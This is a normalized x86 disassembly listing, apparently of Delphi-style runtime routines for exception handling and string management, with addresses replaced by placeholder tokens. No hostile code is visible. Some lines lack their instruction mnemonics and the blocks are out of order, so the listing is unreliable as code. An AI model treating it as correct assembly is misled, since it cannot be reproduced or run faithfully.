mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_406168
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403628
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402bd0
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403988
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403670
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4039c0
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403f78
sub_4039e8
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_406168
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403234
call sub_4035d0
sub_403a3c
call sub_406168
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403234
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_403698
jmp edx
sub_403a84
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4028a0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403be4
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403c0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c52
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403c6c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403cb2
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403d0c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405efc
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d30
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405efc
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d58
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d7c
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403dd8
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403e08
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40130c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4012c4
push eax
call sub_4012e4
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4012c4
push eax
call sub_4012e4
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403e94
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403d7c
call sub_403e08
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403c0c
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403be4
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_4059c8
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403dd8
push eax
call sub_401324
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403f84
push ebp
mov ebp esp
call sub_403160
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_4027bc
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_403fbc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0x8
call sub_40279c
mov [ eax ] edi
mov edx [ ebp + 0x10 ]
mov [ eax + 0x4 ] edx
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_403f84
push eax
push esi
push ebx
call sub_4012f4
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_404008
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4027bc
pop eax
sub_40402c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027bc
sub_40405c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_4040cc
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_402998
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027bc
sub_4040a0
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027bc
sub_4040cc
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_40279c
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_4040f8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_4040cc
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_404008
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_402998
sub_404128
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404148
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call sub_401384
pop ebp
retn 0x4
sub_404164
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404008
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_404654
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404128
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404128
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404654
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4040f8
jmp r-xdata
sub_404200
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4040f8
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404230
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404164
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404278
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_4040f8
not ecx
sub_4042a4
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_402998
pop ebx
retn
mov ecx ebx
sub_4042d0
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_40405c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_404654
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_404654
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_402998
pop edi
pop esi
pop ebx
retn
sub_404314
test edx edx
je r-xdata
mov edx ecx
jmp sub_40405c
test ecx ecx
je sub_40405c
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_4042d0
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_4040cc
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_402998
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_402998
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_40405c
pop edx
pop eax
jmp sub_4042d0
call sub_40405c
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_404388
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_4040cc
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_404654
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_402998
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_40405c
dec [ edx - 0x8 ]
sub_404414
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_4044d4
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_4040cc
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_402998
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4027bc
sub_404528
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_404008
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_4040f8
jmp r-xdata
pop ebx
retn 0x4
sub_404568
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_4044d4
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_402998
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_404654
mov edi ecx
sub_4045b0
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_404654
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_402998
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_402998
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_40460c
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_404654
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_404008
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_4040cc
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4027dc
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_402998
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_4046b8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax ecx
call sub_404008
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4040cc
mov [ edi ] eax
mov edx esi
mov cl bl
call sub_402c40
sub_40472c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call sub_4013c4
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404750
test edx edx
je sub_404714
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404714
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028f8
retn
sub_404774
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404714
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_40495c
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404148
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404148
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_40495c
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404800
jmp r-xdata
sub_404800
test ecx ecx
je sub_404714
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028f8
pop edx
push [ edx ]
mov [ edx ] eax
call sub_4013c4
retn
sub_404824
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404800
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_40488c
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404910
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404880
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404800
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_40495c
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404704
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4046ec
mov ebx eax
mov eax [ edi ]
call sub_404880
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_402998
mov eax esi
sub_4049a0
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4049d0
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_4049d0
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4049d0
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4049a0
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_4028f8
sub_404a70
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404abc
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404abc
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_40402c
jmp r-xdata
call sub_404008
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_40472c
jmp r-xdata
call sub_404714
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404aa4
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
